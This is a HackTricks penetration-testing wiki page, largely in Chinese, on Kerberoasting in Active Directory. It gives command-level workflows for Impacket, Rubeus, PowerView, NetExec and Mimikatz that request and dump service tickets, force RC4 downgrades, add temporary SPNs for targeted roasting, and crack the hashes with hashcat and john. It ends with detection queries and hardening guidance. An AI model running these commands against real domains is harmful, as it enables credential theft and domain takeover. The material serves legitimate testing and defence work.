# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting 专注于获取 TGS ticket，特别是那些与在 Active Directory (AD) 中以用户帐户（不包括计算机帐户）运行的服务相关的 ticket。这些 ticket 的加密使用起源于用户密码的密钥，允许离线破解凭据。ServicePrincipalName (SPN) 属性非空表明使用用户帐户作为服务。

任何已通过身份验证的域用户都可以请求 TGS ticket，因此不需要特殊权限。

### 关键点

- 针对在用户帐户下运行的服务的 TGS ticket（即已设置 SPN 的帐户；非计算机帐户）。
- ticket 使用从服务帐户密码派生的密钥加密，可离线破解。
- 不需要提升权限；任何已认证的帐户都可以请求 TGS ticket。

> [!WARNING]
> Most public tools prefer requesting RC4-HMAC (etype 23) service tickets because they’re faster to crack than AES. RC4 TGS hashes start with `$krb5tgs$23$*`, AES128 with `$krb5tgs$17$*`, and AES256 with `$krb5tgs$18$*`. However, many environments are moving to AES-only. Do not assume only RC4 is relevant.
> Also, avoid “spray-and-pray” roasting. Rubeus’ default kerberoast can query and request tickets for all SPNs and is noisy. Enumerate and target interesting principals first.

### Service account secrets & Kerberos crypto cost

许多服务仍以人工管理密码的用户帐户运行。KDC 使用由这些密码派生的密钥来加密服务 ticket，并将密文提供给任何经过身份验证的主体，因此 kerberoasting 提供了无限的离线猜测机会，且不会触发锁定或 DC 的遥测告警。加密模式决定了破解预算：

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blocks rainbow tables but still allows fast cracking of short passwords. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× faster than AES; attackers force RC4 whenever `msDS-SupportedEncryptionTypes` permits it. |

*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

RC4 的 confounder 仅随机化了密钥流；它并没有为每次猜测增加计算量。除非服务帐户依赖随机秘密（如 gMSA/dMSA、机器帐户或由 vault 管理的字符串），否则妥协速度纯粹受限于 GPU 预算。强制仅使用 AES etypes 可消除每秒数十亿次猜测的劣化，但弱的人类密码仍可能被 PBKDF2 迅速攻破。

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
包含 kerberoast 检查的多功能工具：
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- 枚举 kerberoastable 用户
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- 方法 1: 请求 TGS 并从内存 dump
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 技术 2：自动化工具
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> 一次 TGS 请求会生成 Windows Security Event 4769（请求了一个 Kerberos 服务票证）。

### OPSEC 和 AES-only 环境

- 有意请求 RC4，用于没有 AES 的账户：
- Rubeus: `/rc4opsec` 使用 tgtdeleg 枚举没有 AES 的账户并请求 RC4 服务票证。
- Rubeus: `/tgtdeleg` 与 kerberoast 一起也会在可能情况下触发 RC4 请求。
- Roast AES-only 账户，而不是静默失败：
- Rubeus: `/aes` 枚举启用 AES 的账户并请求 AES 服务票证（etype 17/18）。
- 如果你已经持有 TGT (PTT 或来自 .kirbi)，你可以使用 `/ticket:<blob|path>` 与 `/spn:<SPN>` 或 `/spns:<file>` 并跳过 LDAP。
- 目标、限流和降低噪音：
- 使用 `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>` 和 `/jitter:<1-100>`。
- 使用 `/pwdsetbefore:<MM-dd-yyyy>` 过滤可能弱口令（较旧的密码），或使用 `/ou:<DN>` 针对特权 OU。

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### 持久化 / 滥用

如果你控制或可以修改一个账户，你可以通过添加一个 SPN 使其成为 kerberoastable：
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
将账户降级以启用 RC4，便于进行 cracking（需要对目标对象具有写权限）：
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### 定向 Kerberoast 通过 GenericWrite/GenericAll 对用户 (临时 SPN)

当 BloodHound 显示你对某个用户对象有控制权（例如 GenericWrite/GenericAll）时，即使该用户当前没有任何 SPN，你也可以可靠地“定向 roasted”该用户：

- 将一个临时 SPN 添加到受控用户，使其可用于 Kerberoast。
- 为该 SPN 请求一个使用 RC4 (etype 23) 加密的 TGS-REP，以便更容易破解。
- 使用 hashcat 破解 `$krb5tgs$23$...` 哈希。
- 清理 SPN 以减少痕迹。

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux 单行命令 (targetedKerberoast.py 自动化 add SPN -> request TGS (etype 23) -> remove SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
使用 hashcat autodetect 破解输出 (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: 添加/删除 SPNs 会产生目录更改（目标用户上会生成 Event ID 5136/4738），TGS 请求会生成 Event ID 4769。考虑限速并尽快清理。

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast 在没有域账户的情况下 (AS-requested STs)

In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> 你必须提供一个用户列表，因为在没有有效凭据的情况下，你无法通过此技术查询 LDAP。

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
相关

如果您针对的是 AS-REP roastable 用户，也请参见：

{{#ref}}
asreproast.md
{{#endref}}

### 检测

Kerberoasting 可能很隐蔽。请在 DCs 上查找 Event ID 4769，并应用筛选以减少噪音：

- 排除服务名 `krbtgt` 以及以 `$` 结尾的服务名（计算机帐户）。
- 排除来自机器帐户的请求（`*$$@*`）。
- 仅考虑成功的请求（Failure Code `0x0`）。
- 跟踪加密类型：RC4 (`0x17`)、AES128 (`0x11`)、AES256 (`0x12`)。不要只因 `0x17` 而报警。

示例 PowerShell 排查：
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
其他想法：

- 针对每个主机/用户建立正常的 SPN 使用基线；当单一主体对大量不同 SPN 进行突发请求时触发告警。
- 在已启用 AES 的域中标记不寻常的 RC4 使用。

### 缓解 / 加固

- 使用 gMSA/dMSA 或机器账户为服务提供身份。托管账户具有 120+ 字符的随机密码并会自动轮换，使离线破解变得不切实际。
- 通过将 `msDS-SupportedEncryptionTypes` 设置为仅 AES（十进制 24 / 十六进制 0x18）并随后轮换密码以派生 AES 密钥，从而在服务账户上强制使用 AES。
- 在可能的情况下，在环境中禁用 RC4 并监控 RC4 使用尝试。在 DC 上，可以使用 `DefaultDomainSupportedEncTypes` 注册表值来为没有设置 `msDS-SupportedEncryptionTypes` 的账户引导默认加密类型。务必彻底测试。
- 从用户账户中移除不必要的 SPN。
- 如果无法使用托管账户，则为服务账户使用长度较长且随机的密码（25+ 字符）；禁止常见密码并定期审计。

## References

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
